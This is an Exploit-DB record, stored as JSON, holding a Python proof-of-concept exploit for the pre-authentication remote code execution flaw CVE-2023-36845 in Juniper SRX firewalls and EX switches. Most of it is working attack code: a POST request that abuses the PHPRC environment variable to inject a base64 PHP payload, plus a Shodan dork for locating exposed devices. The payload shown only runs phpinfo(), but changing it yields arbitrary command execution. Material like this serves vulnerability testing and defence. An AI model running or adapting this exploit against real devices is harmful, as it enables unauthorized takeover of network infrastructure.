{"source": "https://www.exploit-db.com/exploits/51776", "vulnName": "Juniper-SRX-Firewalls&EX-switches - (PreAuth-RCE) (PoC)", "vulnEDBID": "51776", "vulnCVE": "N/A", "author": "WHITEOWL", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-02", "vulnContent": "# ***************************************************************************************************\n# Exploit Title: juniper-SRX-Firewalls&EX-switches (PreAuth-RCE) (PoC)\n# Description:\n#\n# This code serves as both a vulnerability detector and a proof of concept for CVE-2023-36845.\n# It executes the phpinfo() function on the login page of the target device, \n# allowing to inspect the PHP configuration. also this script has the option to save the phpinfo() \n# output to a file for further analysis.\n#\n# Shodan Dork: http.favicon.hash:2141724739\n# Date: 2023/10/01\n# Exploit Author: whiteOwl (whiteowl.pub@gmail.com)\n# Vendor Homepage: https://whiteowl-pub.github.io\n# Version: Versions Prior to 20.4R3-S9,21.1R1,21.2R3-S7,21.3R3-S5,\n#          21.4R3-S5,22.1R3-S4,22.2R3-S2,22.3R2-S2/R3-S1,22.\n#          4R2-S1/R3,23.2R1-S1/R2\n# Tested on: JUNOS SM804122pri 15.1X49-D170.4\n# CVE : cve-2023-36845\n# ***************************************************************************************************\n\nimport argparse\nimport requests\n\nbanner = \"\"\"\n*************************************************************\n* CVE-2023-36845 Vulnerability Detector & Proof of concept  *\n* This script checks for the CVE-2023-36845 vulnerability   *\n* and run phpinfo() on vulnerable devices.                  *\n* If you suspect a vulnerable system, please take action    *\n* immediately to secure it.                                 *\n*                                                           *\n* Author: whiteowl                                          *\n*************************************************************\n\"\"\"\n\ndef send_request(url, output_file=None, verbose=False):\n    target_url = f\"{url}/?PHPRC=/dev/fd/0\"\n    data = 'allow_url_include=1\\nauto_prepend_file=\"data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg==\"'\n\n    headers = {\n        'User-Agent': 'Mozilla/5.0',\n    }\n\n    try:\n        response = requests.post(target_url, headers=headers, data=data, stream=True)\n        if response.status_code == 200:\n            print(\"The Target Device is Vulnerable to: CVE-2023-36845\")\n        else:\n            print(\"Not Vulnerable: Status Code\", response.status_code)\n            \n        if output_file:\n            with open(output_file, 'w', encoding='utf-8') as file:\n                file.write(response.text)\n\n        if verbose:\n            print(f\"HTTP Status Code: {response.status_code}\")\n            print(\"Response Headers:\")\n            for header, value in response.headers.items():\n                print(f\"{header}: {value}\")\n            print(\"Response Content:\")\n            print(response.text)\n    except requests.exceptions.RequestException as e:\n        print(f\"An error occurred: {e}\")\n\ndef main():\n    print(banner) \n    parser = argparse.ArgumentParser(description=\"Custom curl-like script\")\n    parser.add_argument(\"-u\", \"--url\", required=True, help=\"URL to send the HTTP request\")\n    parser.add_argument(\"-o\", \"--output\", help=\"Output file to save the HTML content\")\n    parser.add_argument(\"-v\", \"--verbose\", action=\"store_true\", help=\"Enable verbose mode\")\n\n    args = parser.parse_args()\n    send_request(args.url, args.output, args.verbose)\n\nif __name__ == \"__main__\":\n    main()\n            "}